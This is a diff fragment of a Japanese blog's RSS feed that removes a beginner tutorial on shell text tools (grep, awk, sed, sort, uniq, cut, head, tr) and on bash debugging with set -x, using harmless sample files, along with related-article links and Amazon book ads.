-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;検索したい語句を入力して下さい。&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">read&lt;/span> grepvar&lt;span class="p">;&lt;/span>
-&lt;span class="c1"># 大文字小文字の区別をしないオプション -i&lt;/span>
-grep -inc &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$grepvar&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="k">else&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2"> はありません。&amp;#34;&lt;/span>
-&lt;span class="k">fi&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash test
-検索したいファイル名を指定して下さい。
-grepfile.txt
-検索したい語句を入力して下さい。
-linux
-4
-$
-&lt;/code>&lt;/pre>&lt;h2 id="awkコマンド">awkコマンド&lt;/h2>
-&lt;p>awkは、データの操作やレポートの作成に使用されるスクリプト言語です。&lt;br>
-コンパイルを必要とせず、変数、数値関数、文字列関数、論理演算子が使用できます。&lt;br>
-何より処理が高速です。bashよりも高速である場合が多いです。&lt;br>
-このトピックでは、シェルスクリプトで多く多用されるawkコマンドの一例を紹介します。&lt;/p>
-&lt;pre tabindex="0">&lt;code>$ cat grepfile.txt | awk '{ print; }';
-This is Linux
-This is Windows
-This is MAC
-This is Linux
-This is Windows
-This is MAC
-This is Linux
-This is Windows
-This is MAC
-This is Linux
-This is Windows
-This is MAC
-$
-&lt;/code>&lt;/pre>&lt;p>「awk」を使用して特定のパターンを検索することもできます。&lt;/p>
-&lt;pre tabindex="0">&lt;code>$ cat grepfile.txt | awk '/Linux/ { print; }';
-This is Linux
-This is Linux
-This is Linux
-This is Linux
-$
-&lt;/code>&lt;/pre>&lt;p>次の例では、プログラムがターゲットワードを見つけた行からコンテンツを抽出する方法を見ていきます。 「$1」はその行の最初の単語を表し、同様に「$2」は2番目を表し、「$3」は3番目の単語を表し、「$4」はこの場合最後の単語を表します。&lt;/p>
-&lt;pre tabindex="0">&lt;code>$ cat grepfile.txt | awk '/Linux/ { print $3; }';
-Linux
-Linux
-Linux
-Linux
-$
-&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
-&lt;dl>
-&lt;dt>ヒント&lt;/dt>
-&lt;dd>awkはとても優れたプログラミング言語で、シェル薬婦とを学ぶことと同じほどのボリュームのある言語です。ただ、シェルスクリプトで使われる多くのbashコマンドを使いこなすことで、awkでないとできないことは限られます。まずはこのトピックで使われるawkコマンドの利用例を身につければオッケーです。すこしずつ覚えていくことを増やしていけばよいのです。&lt;/dd>
-&lt;/dl>
-&lt;/div>
-&lt;h2 id="sedコマンド">sedコマンド&lt;/h2>
-&lt;p>sedコマンドはストリームエディタの略で、標準入力またはファイルからのテキストの編集操作を実行します。&lt;br>
-このトピックでは「i」を「I」に置き換えます。&lt;br>
-そのためには、次の sed コマンド &amp;lsquo;cat grepfile.txt | sed -e &amp;rsquo;s/i/I/&amp;rsquo; と書くだけで、cat コマンドを使用してファイルの内容を取得し、パイプ &amp;lsquo;|&amp;rsquo; 記号の後に、&amp;lsquo;sed&amp;rsquo; キーワードを使用して、このケースを置き換える操作を指定します。&lt;br>
-「s」はスラッシュと置き換えると言う意味です。&lt;br>
-「-e」はsed コマンドを連続してフィルタリングすることを可能とするオプションです。&lt;br>
-/置き換え前/置き換え後/&lt;br>
-となります。&lt;/p>
-&lt;pre tabindex="0">&lt;code>$ cat grepfile.txt | sed -e &amp;quot;s/i/I/&amp;quot;
-ThIs is Linux
-ThIs is Windows
-ThIs is MAC
-ThIs is Linux
-ThIs is Windows
-ThIs is MAC
-ThIs is Linux
-ThIs is Windows
-ThIs is MAC
-ThIs is Linux
-ThIs is Windows
-ThIs is MAC
-$
-&lt;/code>&lt;/pre>&lt;p>最初に出てくる &amp;lsquo;This is Linux&amp;rsquo; が &amp;lsquo;ThIs is Linux&amp;rsquo; となったことが解ります。&lt;br>
--g オプションを末尾につけることで、複数回の処理で置き換えます。&lt;/p>
-&lt;pre tabindex="0">&lt;code>$ cat grepfile.txt | sed -e &amp;quot;s/i/I/g&amp;quot;
-ThIs Is LInux
-ThIs Is WIndows
-ThIs Is MAC
-ThIs Is LInux
-ThIs Is WIndows
-ThIs Is MAC
-ThIs Is LInux
-ThIs Is WIndows
-ThIs Is MAC
-ThIs Is LInux
-ThIs Is WIndows
-ThIs Is MAC
-$
-&lt;/code>&lt;/pre>&lt;p>以下のコマンドで、処理結果を簡単にファイルに出力して、エディターなどで開いて確認する事ができます。&lt;/p>
-&lt;pre tabindex="0">&lt;code>cat filegrep.txt | sed -e 's/i/I/g' &amp;gt; newfile.txt
-&lt;/code>&lt;/pre>&lt;p>単語全体を別の単語に置き換えることもできます。たとえば、以下に示すスクリプトでは、「Linux」のすべてのインスタンスが端末に表示中に「Unix」に置き換えられます。&lt;/p>
-&lt;pre tabindex="0">&lt;code>$ cat grepfile.txt | sed -e &amp;quot;s/Linux/Unix/g&amp;quot;
-This is Unix
-This is Windows
-This is MAC
-This is Unix
-This is Windows
-This is MAC
-This is Unix
-This is Windows
-This is MAC
-This is Unix
-This is Windows
-This is MAC
-$
-&lt;/code>&lt;/pre>&lt;h2 id="sortコマンド">sortコマンド&lt;/h2>
-&lt;p>テキストファイルを行単位で並べ替える&lt;br>
-sort 並べ替える&lt;br>
-sort -n 数値扱いで並べ替える&lt;br>
-sort -r 逆順で出力&lt;/p>
-&lt;p>まずは以下の読み込み用サンプルファイルを準備します。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:sample.txt" data-lang="bash:sample.txt">name:ヤムチャ skill:狼牙風風拳
-name:孫悟空 skill:かめはめ波
-name:ピッコロ skill:魔貫光殺砲
-name:ヤムチャ skill:繰気弾
-name:孫悟空 skill:元気玉
-name:クリリン skill:気円斬
-name:ヤムチャ skill:かめはめ波
-name:クリリン skill:かめはめ波
-name:孫悟空 skill:ジャン拳
-name:ヤムチャ skill:新狼牙風風拳
-&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ cat sample.txt | grep -o &amp;quot;name:\S*&amp;quot; | sort
-name:孫悟空
-name:孫悟空
-name:孫悟空
-name:クリリン
-name:クリリン
-name:ピッコロ
-name:ヤムチャ
-name:ヤムチャ
-name:ヤムチャ
-name:ヤムチャ
-&lt;/code>&lt;/pre>&lt;p>解説&lt;br>
-grep -E&lt;br>
-検索に「拡張正規表現」を使えるようにする。&lt;br>
-^[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3} でIPアドレスに一致させる。&lt;/p>
-&lt;p>grep -o&lt;br>
-通常の grep では一致した行全体が表示されるが、-o を指定することにより一致した文字のみを表示させることができる。&lt;/p>
-&lt;p>sort&lt;br>
-次の uniq で重複行のカウントを行うため、並び替える。&lt;/p>
-&lt;h2 id="uniqコマンド">uniqコマンド&lt;/h2>
-&lt;p>uniq -c&lt;br>
-重複行のカウントを表示する。&lt;/p>
-&lt;pre tabindex="0">&lt;code>$ cat sample.txt | grep -o &amp;quot;name:\S*&amp;quot; | sort | uniq -c
-3 name:孫悟空
-2 name:クリリン
-1 name:ピッコロ
-4 name:ヤムチャ
-$
-&lt;/code>&lt;/pre>&lt;h2 id="sort--r-逆順">sort -r 逆順&lt;/h2>
-&lt;p>sort -r&lt;br>
-カウントの降順で並べ替える。&lt;/p>
-&lt;pre tabindex="0">&lt;code>$ cat sample.txt | grep -o &amp;quot;name:\S*&amp;quot; | sort | uniq -c | sort -r
-4 name:ヤムチャ
-3 name:孫悟空
-2 name:クリリン
-1 name:ピッコロ
-&lt;/code>&lt;/pre>&lt;h2 id="cutコマンド">cutコマンド&lt;/h2>
-&lt;p>cut:タブ区切りでフィールドを選択して出力する&lt;br>
-cut -d:デリミタを指定。いわゆる区切り文字&lt;br>
-cut -f:抽出するフィールドの番号を指定する。上記コマンドで1を指定した場合は二つ目の&amp;quot;name&amp;quot;が抽出される。&lt;/p>
-&lt;pre tabindex="0">&lt;code>$ cat sample.txt | grep -o &amp;quot;name:\S*&amp;quot; | sort | uniq -c | sort -r | cut -d &amp;quot;:&amp;quot; -f2
-ヤムチャ
-孫悟空
-クリリン
-ピッコロ
-$
-&lt;/code>&lt;/pre>&lt;h2 id="headコマンド">headコマンド&lt;/h2>
-&lt;p>長いメッセージやテキストファイルの先頭だけ／末尾だけを表示する&lt;/p>
-&lt;p>head -n&lt;br>
-n: 出力する行数を指定する。&lt;/p>
-&lt;pre tabindex="0">&lt;code>$ cat sample.txt | grep -o &amp;quot;name:\S*&amp;quot; | sort | uniq -c | sort -r | cut -d &amp;quot;:&amp;quot; -f2 | head -n2
-ヤムチャ
-孫悟空
-$
-&lt;/code>&lt;/pre>&lt;h2 id="trコマンド">trコマンド&lt;/h2>
-&lt;p>テキストファイルの文字を置換する／削除する&lt;/p>
-&lt;p>「-d」オプションで、指定した文字を削除することができます。例えば、Windows環境で作成したテキストファイルの改行コードを、Linux環境向けに置き換えるといった用途に使用できます。&lt;/p>
-&lt;pre tabindex="0">&lt;code>$ cat sample.txt
-name:ヤムチャ skill:狼牙風風拳
-name:孫悟空 skill:かめはめ波
-name:ピッコロ skill:魔貫光殺砲
-name:ヤムチャ skill:繰気弾
-name:孫悟空 skill:元気玉
-name:クリリン skill:気円斬
-name:ヤムチャ skill:かめはめ波
-name:クリリン skill:かめはめ波
-name:孫悟空 skill:ジャン拳
-name:ヤムチャ skill:新狼牙風風拳
-$ cat sample.txt | tr -d '\n'
-name:ヤムチャ skill:狼牙風風拳name:孫悟空 skill:かめはめ波name:ピッコロ skill:魔貫光殺砲name:ヤムチャ skill:繰気弾name:孫悟空 skill:元気玉name:クリリン skill:気円斬name:ヤムチャ skill:かめはめ波name:クリリン skill:かめはめ波name:孫悟空 skill:ジャン拳name:ヤムチャ skill:新狼牙風風拳 $
-&lt;/code>&lt;/pre>&lt;p>Windows環境では、改行を「CR」（16進数0D）と「LF」（16進数0A）の2バイトで表しますが、Linux環境では「LF」のみです。trコマンドでは「CR」を「\r」で表すことができるので、「tr -d \r」としてテキストファイルから「CR」を除去することで、Linux環境用の改行コードに変換できます。&lt;/p>
-&lt;p>「-s」オプションでは、指定した文字が連続している場合には1つにまとめることができます。例えば、「tr -s &amp;ldquo;\r&amp;rdquo;」では、連続した改行を1つにします。catコマンドの「-s」オプションと同じ働きになります。&lt;/p>
-&lt;div class="tips-area tips">
-&lt;dl>
-&lt;dt>ヒント&lt;/dt>
-&lt;dd>trコマンドの &amp;lsquo;\n&amp;rsquo; はシングルクォーテーションで囲む必要があります。&lt;/dd>
-&lt;/dl>
-&lt;/div>
-&lt;h2 id="スクリプトのデバッグ">スクリプトのデバッグ&lt;/h2>
-&lt;p>Bashは広範なデバッグ機能を提供しています。&lt;/p>
-&lt;p>デバッグの方法は３種類あります&lt;/p>
-&lt;p>１．ターミナルの実行時に -x オプションを付与する&lt;/p>
-&lt;pre tabindex="0">&lt;code>$ bash -x helloScript.sh
-&lt;/code>&lt;/pre>&lt;p>２．ソースコードの冒頭のシェバンに -x オプションを付与する&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:debug.sh" data-lang="bash:debug.sh">&lt;span class="cp">#!/bin/bash -x
-&lt;/span>&lt;span class="cp">&lt;/span>:
-:
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>３．デバッグの開始点と終了点を決めてデバッグ&lt;br>
-デバッグの開始点にコマンド &amp;lsquo;set -x&amp;rsquo;終了点には &amp;lsquo;set +x&amp;rsquo; と書きます。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:debug2.sh" data-lang="bash:debug2.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nb">set&lt;/span> -x
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;置き換えたいファイル名を入寮して下さい。&amp;#34;&lt;/span>
-&lt;span class="nb">read&lt;/span> fileName
-&lt;span class="nb">set&lt;/span> +x
-&lt;span class="k">if&lt;/span> &lt;span class="o">[[&lt;/span> -f &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
-sed -e &lt;span class="s2">&amp;#34;s/Linux/Unix/g&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="k">else&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2"> はありません。&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="k">fi&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash test
-+ echo 置き換えたいファイル名を入寮して下さい。
-置き換えたいファイル名を入寮して下さい。
-+ read fileName
-grepfile.txt
-+ set +x
-This is Unix
-This is Windows
-This is MAC
-This is Unix
-This is Windows
-This is MAC
-This is Unix
-This is Windows
-This is MAC
-This is Unix
-This is Windows
-This is MAC
-$
-&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:debug3.sh" data-lang="bash:debug3.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="c1"># デバッグ開始&lt;/span>
-&lt;span class="nb">set&lt;/span> -x
-&lt;span class="nv">var1&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sb">`&lt;/span>date +%M&lt;span class="sb">`&lt;/span>
-&lt;span class="c1"># デバッグ終了&lt;/span>
-&lt;span class="nb">set&lt;/span> +x
-&lt;span class="nv">var2&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sb">`&lt;/span>ls -1 &lt;span class="p">|&lt;/span> wc -l&lt;span class="sb">`&lt;/span>
-&lt;span class="nv">var3&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;DEBUG TEST&amp;#34;&lt;/span>
-&lt;span class="nb">exit&lt;/span> &lt;span class="m">0&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash debug3.sh
-++ date +%M
-+ var1=56
-+ set +x
-$
-&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
-&lt;dl>
-&lt;dt>ヒント&lt;/dt>
-&lt;dd>だいたい解ってきたのではないかと思います。&lt;/dd>
-&lt;dd>要するにシェルスクリプトは「｜パイプ」で繋いで連続する処理をフィルタリングして、目的の結果に近づけていくというものです。&lt;/dd>
-&lt;dd>関数を使って、より長く複雑なことも実行可能です。&lt;/dd>
-&lt;dd>Linux(CUI)でできることはすべてシェルスクリプトでできます。&lt;/dd>
-&lt;/dl>
-&lt;/div>
-&lt;h1 id="関連記事">関連記事&lt;/h1>
-&lt;p>&lt;a class="link" href="https://suzukiiichiro.github.io/posts/2022-01-07-01-suzuki/" target="_blank" rel="noopener"
->【はじめから】「ざっくりわかるシェルスクリプト１」&lt;/a>&lt;br>
-&lt;a class="link" href="https://suzukiiichiro.github.io/posts/2022-01-12-01-suzuki/" target="_blank" rel="noopener"
->【はじめから】「ざっくりわかるシェルスクリプト２」&lt;/a>&lt;br>
-&lt;a class="link" href="https://suzukiiichiro.github.io/posts/2022-01-13-01-suzuki/" target="_blank" rel="noopener"
->【はじめから】「ざっくりわかるシェルスクリプト３」&lt;/a>&lt;br>
-&lt;a class="link" href="https://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/" target="_blank" rel="noopener"
->【 grep 特集】「ざっくりわかるシェルスクリプト４」&lt;/a>&lt;br>
-&lt;a class="link" href="https://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/" target="_blank" rel="noopener"
->【grep/sed/awkも】「ざっくりわかるシェルスクリプト５」&lt;/a>&lt;/p>
-&lt;h1 id="書籍の紹介">書籍の紹介&lt;/h1>
-&lt;aside class="amazon-box">
-&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
-&lt;div class="columns amazon-image">
-&lt;img border="0" src="//ws-fe.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;amp;MarketPlace=JP&amp;amp;ASIN=4774186945&amp;amp;ServiceVersion=20070822&amp;amp;ID=AsinImage&amp;amp;WS=1&amp;amp;Format=_SL250_&amp;amp;tag=nlpqueens-22">
-&lt;/div>
-&lt;div class="columns amazon-info">
-&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20&lt;/h2>
-&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
-シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
-本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
-基本から丁寧に解説。
-第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
-合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
-ますますパワーアップした改訂版をお届けします。&lt;/p>
-&lt;span class="link">Amazonで詳細を見る&lt;/span>
-&lt;/div>
-&lt;/a>
-&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
-&lt;/aside>
-&lt;aside class="amazon-box">
-&lt;a href="https://www.amazon.co.jp/gp/product/B00QJINS1A/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=B00QJINS1A&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=36dff1cf8fa7d4852b5a4a3cf874304b" target="_blank">
-&lt;div class="columns amazon-image">
-&lt;img border="0" src="//ws-fe.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;amp;MarketPlace=JP&amp;amp;ASIN=B00QJINS1A&amp;amp;ServiceVersion=20070822&amp;amp;ID=AsinImage&amp;amp;WS=1&amp;amp;Format=_SL250_&amp;amp;tag=nlpqueens-22">
-&lt;/div>
-&lt;div class="columns amazon-info">
-&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
-&lt;p>すべてのUNIXエンジニア必携!!
-&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
-知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
-&lt;/p>
-&lt;span class="link">Amazonで詳細を見る&lt;/span>
-&lt;/div>
-&lt;/a>
-&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
-&lt;/aside>
-&lt;!-- EOL --></description></item></channel></rss>
+&lt;p>今回は配置フラグの全体的な流れを説明しました。次回は図で説明しながら実際の動きを追ってみましょう。&lt;/p></description></item></channel></rss>
